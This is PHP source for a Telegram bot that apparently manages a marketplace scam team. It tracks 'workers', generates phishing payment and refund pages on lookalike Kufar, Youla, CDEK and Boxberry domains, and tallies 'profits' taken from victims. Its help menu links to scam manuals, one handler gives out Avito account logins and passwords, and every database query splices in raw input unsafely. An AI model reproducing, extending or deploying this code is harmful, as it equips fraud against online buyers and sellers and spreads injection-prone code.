<?php
require_once 'config.php';

if (!function_exists('withdraw')) {
    function withdraw($user_id)
    {
        global $connection;

        $query = mysqli_query($connection, "SELECT `wallet`, `balance` FROM `accounts` WHERE `telegram` = '$user_id'");

        if (mysqli_num_rows($query) > 0) {
            $user = mysqli_fetch_assoc($query);

            if ($user['wallet'] != 0) {
                if ($user['balance'] >= 1000) {
                    mysqli_query($connection, "INSERT INTO `payouts` (`worker`, `amount`, `status`, `requestTime`, `payoutTime`) VALUES ('$user_id', '0', '0', '" . time() . "', '0')");

                    $text = "💰 <b>Введите сумму, которую желаете вывести:</b>";
                } else {
                    $text = "💰 <b>Минимальная сумма для вывода</b> <code>1000 руб.</code>";
                }
            } else {
                $text = "💼 <b>Заполните реквизиты в настройках</b>";
            }
        } else {
            $text = "🚷 <b>Пользователь с таким ID не был найден</b>";
        }

        return $text;

        mysqli_close($connection);
        unset($connection);
    }
}

if (!function_exists('getUserStatus')) {
    function getUserStatus($user_id)
    {
        global $connection;
        $query = mysqli_query($connection, "SELECT `access` FROM `accounts` WHERE `telegram` = '$user_id'");

        if (mysqli_num_rows($query) > 0) {
            $user = mysqli_fetch_assoc($query);

            if ($user['access'] == -1) $status = 'Заблокирован';
            if ($user['access'] == 0) $status = 'Неактивирован';
            if ($user['access'] == 1) $status = 'Воркер';
            if ($user['access'] == 25) $status = 'Дроповод';
            if ($user['access'] == 100) $status = 'Помощник';
            if ($user['access'] >= 500) $status = 'Модератор';
            if ($user['access'] == 999) $status = 'Создатель';

            return $status;
        }

        mysqli_close($connection);
        unset($connection);
    }
}

if (!function_exists('getMyProfile')) {
    function getMyProfile($user_id, $admin = 0, $buttons = 0)
    {
        global $connection;
        if ($admin == 0) $query = mysqli_query($connection, "SELECT `username`, `telegram`, `wallet`, `balance`, `referral`, `access`, `warns`, `stake`, `card`, `inviter`, `created` FROM `accounts` WHERE `telegram` = '$user_id' AND `access` > '0'");
        if ($admin == 1) $query = mysqli_query($connection, "SELECT `username`, `telegram`, `wallet`, `balance`, `referral`, `access`, `warns`, `stake`, `card`, `inviter`, `created` FROM `accounts` WHERE `telegram` = '$user_id'");

        if (mysqli_num_rows($query) > 0) {
            $user = mysqli_fetch_assoc($query);
            $tadverts = mysqli_query($connection, "SELECT `id` FROM `adverts` WHERE `worker` = '$user_id'");
            $ttracks = mysqli_query($connection, "SELECT `id` FROM `trackcodes` WHERE `worker` = '$user_id'");
            $adverts = mysqli_query($connection, "SELECT `id` FROM `adverts` WHERE `worker` = '$user_id' AND `status` = '1'");
            $tracks = mysqli_query($connection, "SELECT `id` FROM `trackcodes` WHERE `worker` = '$user_id' AND `status` > '0'");
            $profit = mysqli_fetch_assoc(mysqli_query($connection, "SELECT COUNT(`id`) AS `count`, SUM(`amount`) AS `total` FROM `payments` WHERE `worker` = '$user_id' AND `status` = '1'"));
            $invites = mysqli_fetch_assoc(mysqli_query($connection, "SELECT COUNT(`id`) AS `count` FROM `accounts` WHERE `inviter` = '$user_id'"));

            $stake = explode(':', $user['stake']);

            if ($profit['total'] == NULL) $profit['total'] = '0';

            if ($admin == 1) {
                $text = "👤 <b>Информация о работнике</b> <a href=\"tg://user?id=$user[telegram]\">$user[username]</a>\n\n";
            } else {
                $text = "👤 <b>Ваш профиль</b>\n\n";
            }

            if ($user['wallet'] == 0) $user['wallet'] = 'Не закреплен';

            $text .= "🆔 <b>Реферальный код:</b> <code>$user[telegram]</code>\n";
            $text .= "💵 <b>Баланс: </b>" . $user['balance'] . " Руб.\n";
            $text .= "💸 <b>Текущая ставка:</b> <code>оплата - $stake[0]% и возврат - $stake[1]%</code>\n";
            if ($admin == 1) $text .= "🗂 <b>Всего объявлений:</b> <code>" . (mysqli_num_rows($tadverts) + mysqli_num_rows($ttracks)) . "</code>\n";
            $text .= "🧾 <b>Активных объявлений:</b> <code>" . (mysqli_num_rows($adverts) + mysqli_num_rows($tracks)) . "</code>\n";
            $text .= "💼 <b>BTC кошелёк:</b> <code>$user[wallet]</code>\n";

            $text .= "\n🐘 <b>Успешных заявок:</b> <code>$profit[count]</code>\n";
            $text .= "💰 <b>Общая сумма заработка:</b> <code>$profit[total] руб.</code>\n";
            if ($admin == 1 AND $user['card'] != '0') $text .= "💳 <b>Карта:</b> <code>$user[card]</code>\n";
            if ($admin == 1 AND $user['card'] == '0') $text .= "💳 <b>Карта:</b> <i>Не привязана</i>\n";

            $text .= "\n🤝 <b>Приглашено:</b> <code>" . Endings($invites['count'], "воркер", "воркера", "воркеров") . "</code>\n";
            $text .= "🤑 <b>Заработано на рефералах:</b> <code>" . number_format($user['referral']) . " руб.</code>\n";
            if ($user['inviter'] != 0) $text .= "👹 <b>Пригласил:</b> <a href=\"tg://user?id=$user[inviter]\">$user[inviter]</a>\n";

            $text .= "\n💎 <b>Статус:</b> <i>" . getUserStatus($user_id) . "</i>\n";
            $text .= "\n⚠️ <b>Предупреждений:</b> <code>[$user[warns]/3]</code>\n";
            $text .= "🤝 <b>В команде:</b> <code>" . Endings(floor((time() - $user['created']) / 86400), "день", "дня", "дней") . "</code>\n";

            #if($user['card'] == 0) $text .= "\n💳 <b>Карта не привязана, свяжитесь с модераторами!</b>\n";
            #if($user['card'] != 0) $text .= "\n💳 <b>Карта привязана — можно воркать!</b>\n";

            if ($admin == 1) {
                $keyboard = Array('inline_keyboard' => Array(Array(Array('text' => '🗂 Показать объявления', 'callback_data' => '/adverts/' . $user['telegram'] . '/'))));

                if ($user['access'] == '-1') {
                    array_push($keyboard['inline_keyboard'], Array(Array('text' => '♻️ Разблокировать', 'callback_data' => '/unban/' . $user['telegram'] . '/')));
                } else {
                    array_push($keyboard['inline_keyboard'], Array(Array('text' => '🚫 Заблокировать', 'callback_data' => '/ban/' . $user['telegram'] . '/')));
                    array_push($keyboard['inline_keyboard'], Array(Array('text' => '⚠️ Выдать предупреждение [' . $user['warns'] . '/3]', 'callback_data' => '/warn/' . $user['telegram'] . '/')));
                }
            } else {
                $keyboard = Array('inline_keyboard' => Array(
                    Array(Array('text' => '⚙️ Настройки', 'callback_data' => '/mysettings/')),
                    Array(Array('text' => '💰 Вывести', 'callback_data' => '/withdraw/')),
                ));
            }

            if ($buttons == 0) return $text;
            if ($buttons == 1) return json_encode($keyboard);
        }

        mysqli_close($connection);
        unset($connection);
    }
}

if (!function_exists('mySettings')) {
    function mySettings($user_id, $buttons = 0)
    {
        global $connection;

        $query = mysqli_query($connection, "SELECT `hidden` FROM `accounts` WHERE `telegram` = '$user_id' AND `access` > '0'");

        if (mysqli_num_rows($query) > 0) {
            $user = mysqli_fetch_assoc($query);

            if ($user['hidden'] == 0) $hidden = 'Не скрыт';
            if ($user['hidden'] == 1) $hidden = 'Скрыт';

            $text = "🔧 <b>Мои настройки</b>\n\n";
            $text .= "🌚 Ваш логин при оплате: <code>$hidden</code>\n";

            $text .= "\n⚠️ *Не рекомендуем работать с открытым логином";

            $btc_address_btn = Array(Array('text' => '💸 Изменить BTC кошелек', 'callback_data' => '/change_btc/'));
            if ($user['hidden'] == 0) $keyboard = Array('inline_keyboard' => Array(Array(Array('text' => '🌚 Скрыть логин от всех', 'callback_data' => '/profithide/')), $btc_address_btn));
            if ($user['hidden'] == 1) $keyboard = Array('inline_keyboard' => Array(Array(Array('text' => '🌝 Не скрывать логин от всех', 'callback_data' => '/profithide/')), $btc_address_btn));


            if ($buttons == 0) return $text;
            if ($buttons == 1) return json_encode($keyboard);
        }

        mysqli_close($connection);
        unset($connection);
    }
}

if (!function_exists('getMyAdverts')) {
    function getMyAdverts($user_id, $admin = 0, $buttons = 0)
    {
        global $connection;
        global $domains;

        $adverts = mysqli_query($connection, "SELECT `type`, `advert_id`, `title`, `price`, `delivery`, `views` FROM `adverts` WHERE `worker` = '$user_id' AND `status` = '1'");

        $x = 0;
        $text = "🗂 <b>Список ваших активных объявлений:</b>\n\n";
        $keyboard = Array('inline_keyboard' => Array(Array()));

        if (mysqli_num_rows($adverts) > 0) {
            while ($row = mysqli_fetch_assoc($adverts)) {
                $x = $x + 1;

                if ($x >= 10) {
                    break;
                } else {
                    if (mb_strlen($row['title']) > 18) $row['title'] = mb_substr($row['title'], 0, 18) . '[...]';

                    if ($row['delivery'] == 0) {
                        global $settings;
                        $row['delivery'] = $settings['delivery'];
                    }

                    if ($row['type'] == 2) $url = 'https://kufar.de/' . $row['advert_id'] AND $payment = '' . $domains['kufar'] . '/buy?id=' . $row['advert_id'];
                    $text .= "<b>$x.</b> $row[title] — <b>Сумма:</b> <code>$row[price] руб.</code> | <b>Доставка:</b> <code>$row[delivery] руб.</code>\n\n";
                    $text .= "<code>$payment</code> <b>(Чтобы на телефоне было легко скопировать)</b>\n\n";
					$text .= "$payment <b>(Для пк)</b>\n";

                    array_push($keyboard['inline_keyboard'], Array(Array('text' => $x . '. ' . $row['title'] . ' — ' . $row['price'] . ' руб.', 'callback_data' => '/advert/' . $row['advert_id'] . '/')));
                }
            }
        }

        $trackcodes = mysqli_query($connection, "SELECT `code`, `sender`, `product`, `courier`, `weight`, `amount`, `equipment`, `recipient`, `city`, `address`, `phone`, `status`, `status`, `time` FROM `trackcodes` WHERE `worker` = '$user_id' AND `status` > '0'");

        if (mysqli_num_rows($trackcodes) > 0) {
            while ($row = mysqli_fetch_assoc($trackcodes)) {
                $x = $x + 1;

                if ($x > 10) {
                    break;
                } else {
                    if (mb_strlen($row['product']) > 18) $row['product'] = mb_substr($row['product'], 0, 18) . '[...]';
                    $text .= "<b>$x.</b> <a href=\"https://$domains[boxberry]/track?track_id=$row[code]\">$row[product]</a> — <b>Сумма:</b> <code>$row[amount] руб.</code>\n";
                    $text .= "<b>Получатель:</b> <i>$row[recipient]</i>\n\n";
                    array_push($keyboard['inline_keyboard'], Array(Array('text' => $x . '. ' . $row['product'] . ' — ' . $row['amount'] . ' руб.', 'callback_data' => '/trackcode/' . $row['code'] . '/')));
                }
            }
        }

        if (mysqli_num_rows($adverts) == 0 AND mysqli_num_rows($trackcodes) == 0) {
            if ($admin == 1) {
                $text = "📭 <b>У работника нет активных объявлений или трек-кодов</b>";
            } else {
                $text = "📭 <b>У вас нет активных объявлений или трек-кодов</b>\n\n";
                $text .= "Чтобы сгенерировать своё объявление или трек-код, выберите соответствующий раздел.";
            }
        }

        array_push($keyboard['inline_keyboard'], Array(Array('text' => '📕 Помощь', 'callback_data' => '/help')));

        if ($buttons == 0) return $text;
        if ($buttons == 1) return json_encode($keyboard);

        mysqli_close($connection);
        unset($connection);
        unset($settings);
    }
}

if (!function_exists('showTrack')) {
    function showTrack($user_id, $code, $buttons = 0)
    {
        global $connection;

        $query = mysqli_query($connection, "SELECT `type`, `code`, `product`, `worker`, `amount`, `status` FROM `trackcodes` WHERE `code` = '$code' AND `worker` = '$user_id'");

        if (mysqli_num_rows($query) > 0) {
            $track = mysqli_fetch_assoc($query);

            if ($track['status'] == -1) {
                mysqli_query($connection, "UPDATE `trackcodes` SET `status` = '1', `time` = '" . time() . "' WHERE `code` = '$code' AND `worker` = '$user_id' AND `status` = '-1'");

                if ($track['type'] == 0) $platform = 'Белпочта';
                if ($track['type'] == 1) $platform = 'СДЭК';
                if ($track['type'] == 2) $platform = 'ПЭК';
                if ($track['type'] == 3) $platform = 'Почта РФ';

                $text = "💎 <b>Ваш трек-код был восстановлен</b>\n\n";
                $text .= "<b>Трек-код:</b> <code>$code</code>\n";
                $text .= "<b>Платформа:</b> <code>$platform</code>\n";
                $text .= "<b>Название товара:</b> <code>$track[product]</code>\n";
                $text .= "<b>Сумма товара:</b> <code>$track[amount] руб.</code>\n";
            } else {
                $text = "🧨 <b>Данный трек-код не скрыт</b>";
            }
        } else {
            $text = "🔎 <b>Данный трек-код не принадлежит вам или он ещё не создан</b>";
        }

        if ($buttons == 0) return $text;

        mysqli_close($connection);
        unset($connection);
    }
}

if (!function_exists('getTrack')) {
    function getTrack($user_id, $code, $buttons = 0)
    {
        global $connection;
        global $domains;

        $query = mysqli_query($connection, "SELECT * FROM `trackcodes` WHERE `code` = '$code' AND `worker` = '$user_id'");

        if (mysqli_num_rows($query) > 0) {
            $track = mysqli_fetch_assoc($query);

            $keyboard = Array('inline_keyboard' => Array(Array()));


            if ($track['status'] == -1) $status = 'Скрыто';
            if ($track['status'] == 0) $status = 'В обработке';
            if ($track['status'] == 1) $status = 'Ожидает оплаты';
            if ($track['status'] == 2) $status = 'Оплачено';
            if ($track['status'] == 3) $status = 'Возврат средств';

            if ($track['type'] == 0) $platform = 'Белпочта';
            if ($track['type'] == 1) $platform = 'СДЭК';
            if ($track['type'] == 2) $platform = 'ПЭК';
            if ($track['type'] == 3) $platform = 'Почта РФ';


            $payments = mysqli_fetch_assoc(mysqli_query($connection, "SELECT COUNT(`id`) AS `count`, SUM(`amount`) AS `total` FROM `payments` WHERE `type` = '2' AND `advert_id` = '$track[code]' AND `status` = '1'"));

            $text = "🎟 <b>Информация о трек-коде</b> <code>$track[code]</code>\n\n";
            $text .= "<b>Платформа:</b> <code>$platform</code>\n";
            $text .= "<b>Название товара:</b> <code>$track[product]</code>\n";
            $text .= "<b>Сумма товара:</b> <code>$track[amount] руб</code>\n";
            $text .= "<b>Просмотров:</b> <code>" . Endings($track['views'], "просмотр", "просмотора", "просмотров") . "</code>\n";
            $text .= "<b>Успешных профитов:</b> <code>$payments[count]</code>\n";
            $text .= "<b>Общая сумма профита:</b> <code>" . number_format($payments['total']) . " руб.</code>\n";
            $text .= "<b>Статус:</b> <code>$status</code>\n";
            $text .= "<b>Дата генерации:</b> <code>" . date("d.m.Y в H:i:s", $track['time']) . "</code>\n";


            if ($track['status'] == -1) {

                array_push($keyboard['inline_keyboard'], Array(Array('text' => '♻️ Восстановить трек-код', 'callback_data' => '/trackshow/' . $track['code'] . '/')));

            } else {

                if ($track['type'] == 0) {
                    array_push($keyboard['inline_keyboard'], Array(Array('text' => '📋 Перейти на трек-код', 'url' => 'https://' . $domains['boxberry'] . '/track?track_id=' . $track['code'])));
                } elseif ($track['type'] == 1) {
                    array_push($keyboard['inline_keyboard'], Array(Array('text' => '📋 Перейти на трек-код', 'url' => 'https://' . $domains['cdek'] . '/track?track_id=' . $track['code'])));
                } elseif ($track['type'] == 2) {
                    array_push($keyboard['inline_keyboard'], Array(Array('text' => '📋 Перейти на трек-код', 'url' => 'https://' . $domains['pec'] . '/track?track_id=' . $track['code'])));
                } elseif ($track['type'] == 3) {
                    array_push($keyboard['inline_keyboard'], Array(Array('text' => '📋 Перейти на трек-код', 'url' => 'https://' . $domains['pochta'] . '/track?track_id=' . $track['code'])));
                } else {
                    $keyboard = Array('inline_keyboard' => Array(Array()));
                }


                array_push($keyboard['inline_keyboard'], Array(Array('text' => '🗑 Скрыть трек-код', 'callback_data' => '/trackhide/' . $track['code'] . '/')));
                if ($track['status'] == 1) array_push($keyboard['inline_keyboard'], Array(Array('text' => '🤟 Оплачено', 'callback_data' => '/trackpay/' . $track['code'] . '/'), Array('text' => '💸 Возврат средств', 'callback_data' => '/trackref/' . $track['code'] . '/')));
                if ($track['status'] == 2) array_push($keyboard['inline_keyboard'], Array(Array('text' => '⏳ Ожидает оплаты', 'callback_data' => '/trackwait/' . $track['code'] . '/'), Array('text' => '💸 Возврат средств', 'callback_data' => '/trackref/' . $track['code'] . '/')));
                if ($track['status'] == 3) array_push($keyboard['inline_keyboard'], Array(Array('text' => '⏳ Ожидает оплаты', 'callback_data' => '/trackwait/' . $track['code'] . '/'), Array('text' => '🤟 Оплачено', 'callback_data' => '/trackpay/' . $track['code'] . '/')));
            }
        } else {
            $text = "📭 <b>Трек-код с таким кодом не был найден или он не принадлежит вам</b>";
        }

        if ($buttons == 0) return $text;
        if ($buttons == 1) return json_encode($keyboard);

        mysqli_close($connection);
        unset($connection);
    }
}

if (!function_exists('getAdvert')) {
    function getAdvert($user_id, $advert_id, $buttons = 0)
    {
        global $connection;
        global $settings;
        global $domains;

        $query = mysqli_query($connection, "SELECT * FROM `adverts` WHERE `advert_id` = '$advert_id' AND `worker` = '$user_id'");

        if (mysqli_num_rows($query) > 0) {
            $advert = mysqli_fetch_assoc($query);

            if ($advert['type'] == 0) $platform = 'Куфар 2.0';
            if ($advert['type'] == 1) $platform = 'Юла';
            if ($advert['type'] == 2) $platform = 'Куфар 1.0';

            if ($advert['delivery'] == 0) {
                $advert['delivery'] = $settings['delivery'];
            }

            $payments = mysqli_fetch_assoc(mysqli_query($connection, "SELECT COUNT(`id`) AS `count`, SUM(`amount`) AS `total` FROM `payments` WHERE `advert_id` = '$advert_id' AND `status` = '1'"));

            if ($advert['status'] == -1) $status = 'Скрыто';
            if ($advert['status'] == 0) $status = 'В обработке';
            if ($advert['status'] == 1) $status = 'Активно';

            $text = "💼 <b>Информация об объявлении</b> <code>$advert[advert_id]</code>\n\n";
            $text .= "<b>Платформа:</b> <code>$platform</code>\n";
            $text .= "<b>Название товара:</b> <code>$advert[title]</code>\n";
            $text .= "<b>Сумма товара:</b> <code>$advert[price] руб.</code>\n";
            $text .= "<b>Сумма доставки:</b> <code>$advert[delivery] руб.</code>\n";
            $text .= "<b>Просмотров:</b> <code>" . Endings($advert['views'], "просмотр", "просмотора", "просмотров") . "</code>\n";
            $text .= "<b>Успешных профитов:</b> <code>$payments[count]</code>\n";
            $text .= "<b>Общая сумма профита:</b> <code>" . number_format($payments['total']) . " руб.</code>\n";
            $text .= "<b>Статус:</b> <code>$status</code>\n";
            $text .= "<b>Дата генерации:</b> <code>" . date("d.m.Y в H:i:s", $advert['time']) . "</code>\n";

            if ($advert['type'] == 0) {
                $keyboard = Array('inline_keyboard' => Array(Array(Array('text' => 'Страница оплаты', 'url' => 'https://' . $domains['onliner'] . '/buy?id=' . $advert['advert_id']), Array('text' => 'Страница возврата', 'url' => 'https://' . $domains['onliner'] . '/refund?id=' . $advert['advert_id']))));
            } elseif ($advert['type'] == 1) {
                $keyboard = Array('inline_keyboard' => Array(Array(Array('text' => 'Страница оплаты', 'url' => 'https://' . $domains['youla'] . '/product/' . $advert_id . '/buy/delivery'), Array('text' => 'Страница возврата', 'url' => 'https://' . $domains['youla'] . '/refund/' . $advert_id))));
            } elseif ($advert['type'] == 2) {
                $keyboard = Array('inline_keyboard' => Array(Array(Array('text' => 'Страница оплаты', 'url' => 'https://' . $domains['kufar'] . '/buy?id=' . $advert['advert_id']), Array('text' => 'Страница возврата', 'url' => 'https://' . $domains['kufar'] . '/pay/refund.php?id=' . $advert['advert_id']))));
            } else {
                $keyboard = Array('inline_keyboard' => Array(Array()));
            }

            if ($advert['status'] == -1) {
                array_push($keyboard['inline_keyboard'], Array(Array('text' => 'Восстановить объявление', 'callback_data' => '/show/' . $advert_id . '/')));
            } elseif ($advert['status'] > 0) {
                array_push($keyboard['inline_keyboard'], Array(Array('text' => 'Скрыть объявление', 'callback_data' => '/hide/' . $advert_id . '/')));
            }
        } else {
            $text = "📭 <b>Объявление с таким ID не было найдено или оно не принадлежит вам</b>";
        }

        if ($buttons == 0) return $text;
        if ($buttons == 1) return json_encode($keyboard);

        mysqli_close($connection);
        unset($connection);
        unset($settings);
    }
}


if (!function_exists('showRules')) {
    function showRules()
    {
        $text = "1. Запрещено медиа с некорректным содержанием (порно, насилие, убийства, призывы к экстремизму, реклама наркотиков)\n";
        $text .= "2. Запрещен спам, флуд, пересылки с других каналов, ссылки на сторонние ресурсы\n";
        $text .= "3. Запрещено узнавать у друг друга персональную информацию\n";
        $text .= "4. Запрещено оскорблять администрацию\n";
        $text .= "5. Запрещено попрошайничество в беседе работников\n";
        $text .= "6. Администрация не несёт ответственности за блокировку ваших кошельков/карт\n";

        return $text;
    }
}

if (!function_exists('showAbout')) {
    function showAbout($buttons = 0)
    {
        global $connection;

        $stake = mysqli_fetch_assoc(mysqli_query($connection, "SELECT `stake` FROM `config`"));
        $stake = explode(':', $stake['stake']);

        $text = "🚀 <b>Информация о проекте</b>\n\n";
        $text .= "<b>Выплаты проекта:</b>\n";
        $text .= "— Оплата — <b>$stake[0]%</b>\n";
        $text .= "— Возврат — <b>$stake[1]%</b>\n\n";
        $text .= "На данный момент мы имеем несколько направлений и систем\n";
        $text .= "— Куфар 1.0\n";
        $text .= "— Куфар 2.0\n\n";
        $text .= "— CDEK\n\n";

        $keyboard = Array('inline_keyboard' => Array(Array(Array('text' => '📜 Правила', 'callback_data' => '/showrules/'))));

        if ($buttons == 0) return $text;
        if ($buttons == 1) return json_encode($keyboard);

        mysqli_close($connection);
        unset($connection);
    }
}

if (!function_exists('showHelp')) {
    function showHelp($buttons = 0)
    {
        global $config;

        $text = "📕 <b>Ознакомьтесь с нашими мануалами:</b>\n\n";
        $text .= "<a href=\"https://telegra.ph/Manual-po-vyvodu-c-BTC-BANKERa-01-07\">💰 Мануал по выводу с BTC banker</a>\n";
        $text .= "<a href=\"https://telegra.ph/Manual-po-skamu-na-avito-ot-WEBSCAM-01-07\">📦 Мануал по скаму на Авито</a>\n";
        $text .= "<a href=\"https://telegra.ph/Gajd-pro-anonimnost-01-07-2\">🌚 Гайд по анонимности</a>\n";
        $text .= "<a href=\"https://telegra.ph/Rabota-so-Sphere-01-07-2\">👻 Мануал по Sphere (браузер)</a>\n";
        $text .= "<a href=\"https://telegra.ph/CHto-luchshe-vystavlyat-na-prodazhu-01-07\">⭐️ Что лучше выставлять на продажу?</a>\n";
        $text .= "<a href=\"https://telegra.ph/Novaya-platforma-skama-Boxberry-01-07\">🚚 Мануал по скаму на Boxberry</a>\n";
        $text .= "<a href=\"https://telegra.ph/Instrukciya-po-bezopasnosti-s-telefona-01-10\">📱 Инструкция по безопасности с телефона</a>\n\n";
        $text .= "<a href=\"" . $config['invites']['payments'] . "\">➡️ Наш канал с залётами 💸</a>\n";

        $keyboard = Array('inline_keyboard' => Array(Array(Array('text' => '🤖 Показать список команд', 'callback_data' => '/showCommands/')), Array(Array('text' => '🔹 Получить аккаунт Авито', 'callback_data' => '/getaccount/avito/'), Array('text' => '🔸 Получить аккаунт Юлы', 'callback_data' => '/getaccount/youla/')), Array(Array('text' => '📰 Скриншоты от тех.поддержки', 'url' => 'http://pussysquad.ru/pages/avito-delivery.html')), Array(Array('text' => '💳 Карта прямого приема', 'callback_data' => '/getcard/'))));

        if ($buttons == 0) return $text;
        if ($buttons == 1) return json_encode($keyboard);
        unset($config);
    }
}

if (!function_exists('getCard')) {
    function getCard()
    {
        global $connection;

        $card = '';

        $query = mysqli_query($connection, "SELECT `status` FROM `cards` WHERE `number` = '$card' AND `status` = '1'");

        if (mysqli_num_rows($query) > 0) {
            $text = "💳 <b>Карта прямого приёма</b>\n\n";
            $text .= "<b>Номер карты:</b> <code>" . chunk_split($card, 4, ' ') . "</code>\n";
            $text .= "<b>Банк:</b> <code>Санкт-Петербург</code>\n";
            $text .= "<b>Имя получателя:</b> <code>Надикто Тимофей Сергеевич</code>\n";
        } else {
            $text = "🥺 <b>На данный момент карта для прямого приема средств не привязана</b>";
        }

        return $text;

        mysqli_close($connection);
        unset($connection);
    }
}

if (!function_exists('showCommands')) {
    function showCommands($buttons = 0)
    {
        global $config;

        $text = "⚙️ Список команд бота:\n\n";
        $text .= "/help — Показать список команд\n";
        $text .= "/info — Показать информацию о себе\n";
        $text .= "/adverts — Посмотреть свои активные объявления\n";
        $text .= "/setdelivery <code>[ID объявления];[Сумма]</code> — Установить сумму за доставку\n";
        $text .= "/setprice <code>[ID объявления];[Сумма]</code> — Изменить сумму объявления\n";
        $text .= "/settitle <code>[ID объявления];[Название]</code> — Изменить название объявления\n";
        $text .= "/setimage <code>[ID объявления];[URL изображения]</code> — Изменить изображение товара\n";
        $text .= "/hide <code>[ID объявления]</code> — Скрыть объявление\n";

        $keyboard = Array('inline_keyboard' => Array(
            Array(Array('text' => '💬 Чат воркеров', 'url' => $config['invites']['workers']), Array('text' => '💸 Чат с залётами', 'url' => $config['invites']['payments'])),
        ));

        if ($buttons == 0) return $text;
        if ($buttons == 1) return json_encode($keyboard);

        unset($config);
    }
}

if (!function_exists('referralInfo')) {
    function referralInfo($user_id)
    {
        $text = "🤝 <b>Реферальная система</b>\n\n";
        $text .= "Приглашайте новых пользователей и получайте пассивный доход от успешных профитов ваших рефералов!\n\n";
        $text .= "Чтобы пользователь стал вашим рефералом, при заполнении анкеты, он должен указать в пункте «<b>Кто вас пригласил?</b>» ваш Telegram ID — <code>$user_id</code>\n\n";
        $text .= "В случае принятия данного пользователя в команду, он становится вашим рефералом и вы будете получать 2% от его успешных профитов.\n\n";
        $text .= "Получается, что в случае успешного залёта вашего реферала на 750 RUB, вы получите с этого 10 RUB, а при залёте на 5300 RUB, вы получите 100 RUB\n\n";
        $text .= "Ваша реферальная ссылка:\n";
        $text .= "https://telegram.me/webscam_bot?start=ref$user_id\n";
        $text .= "Для вставки на сайтах, форумах:\n";
        $text .= "https://tgmssg.ru/webscam_bot&start=ref$user_id";

        return $text;
    }
}

$data = json_decode(file_get_contents('php://input'));
if (isset($data)) {
    if (isset($callback)) {

        if ($callback['type'] == "/help") {
            send($config['token'], 'editMessageText', Array('chat_id' => $callback['chat_id'], 'message_id' => $callback['message_id'], 'text' => showCommands(), 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => showCommands(1)));
        }

        if ($callback['type'] == "/account/avito/") {
            $t = mysqli_fetch_assoc(mysqli_query($connection, "SELECT `avito` FROM `accounts` WHERE `telegram` = '$callback[from]' AND `access` > '0'"));
            $nov = strtotime("now");
            //$six = strtotime($t['avito']) + 21600; // 6 Часов
            $day = strtotime($t['avito']) + 86400; // 24 часа
            if ($day >= $nov) {
                $razn = $day - $nov;
                $siss = Endings(floor($razn / 3600), "час", "часа", "часов");
                $text = "⚠️ Вы уже получили свой аккаунт. \n⏳ <b>Подождите ещё {$siss}</b>";
                send($config['token'], 'editMessageText', Array('chat_id' => $callback['chat_id'], 'message_id' => $callback['message_id'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
            } else {
                $query = mysqli_query($connection, "SELECT * FROM `avito` WHERE `used` = '0' ORDER BY `id`");
                if (mysqli_num_rows($query) > 0) {
                    $avito = mysqli_fetch_assoc($query);
                    $log = $avito['login'];
                    $pass = $avito['password'];
                    mysqli_query($connection, "UPDATE `accounts` SET `avito` = NOW() - INTERVAL 5 MINUTE WHERE `telegram` = '{$callback[from]}'");
                    mysqli_query($connection, "UPDATE avito SET used = 1 WHERE id = $avito[id]");
                    $text = "👾 <b>Бесплатный аккаунт</b>\n\nПлатформа: <code>Avito</code>\nЛогин: <code>{$log}</code>\nПароль: <code>{$pass}</code>\n<b>Следующий аккаунт через 1 день</b>";
                    send($config['token'], 'editMessageText', Array('chat_id' => $callback['chat_id'], 'message_id' => $callback['message_id'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                    $text2 = "👾 <a href=\"tg://user?id=$callback[from]\">Воркер</a> получил бесплатный аккаунт под логином <code>{$log}</code>";
                    send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text2, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                    send($config['token'], 'sendMessage', Array('chat_id' => '808326111', 'text' => $text2, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                } else {
                    $text = "😔 К сожалению сейчас аккаунтов для Авито нет, посмотрите позже";
                    send($config['token'], 'editMessageText', Array('chat_id' => $callback['chat_id'], 'message_id' => $callback['message_id'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                }
            }
        }

        if (preg_match('/^\/warn\/\d+\/$/', $callback['type'])) {
            $user_id = substr($callback['type'], 6, -1);

            if ($user_id == '808326111' OR $user_id == '1204750285') {
                $text = "😡 <b>Ты ахуел,ты каво варнеш?</b>";
                send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
				send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders1'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
            } else {
                $query = mysqli_query($connection, "SELECT `telegram`, `access`, `warns` FROM `accounts` WHERE `telegram` = '$user_id' AND `access` > '0'");

                if (mysqli_num_rows($query) > 0) {
                    $user = mysqli_fetch_assoc($query);

                    if ($user['warns'] < 3) {
                        mysqli_query($connection, "UPDATE `accounts` SET `warns` = `warns`+1 WHERE `telegram` = '$user_id' AND `access` > '0'");

                        send($config['token'], 'editMessageText', Array('chat_id' => $callback['chat_id'], 'message_id' => $callback['message_id'], 'text' => getMyProfile($user_id, 1), 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE, 'reply_markup' => getMyProfile($user_id, 1, 1)));

                        $text = "⚠️ <b>Модератор</b> <a href=\"tg://user?id=$callback[from]\">$callback[firstname] $callback[lastname]</a> <b>выдал предупреждение</b> <a href=\"tg://user?id=$user_id\">воркеру</a> <code>[" . ($user['warns'] + 1) . "/3]</code>";
                        send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                        $text = "⚠️ <b>Модератор выдал вам предупреждение</b> <code>[" . ($user['warns'] + 1) . "/3]</code>";
                        send($config['token'], 'sendMessage', Array('chat_id' => $user_id, 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                    } else {
                        mysqli_query($connection, "UPDATE `accounts` SET `access` = '-1', `warns` = `warns`+1, `card` = '0' WHERE `telegram` = '$user_id'");
                        mysqli_query($connection, "UPDATE `adverts` SET `status` = '-1' WHERE `worker` = '$user_id' AND `status` > '1'");
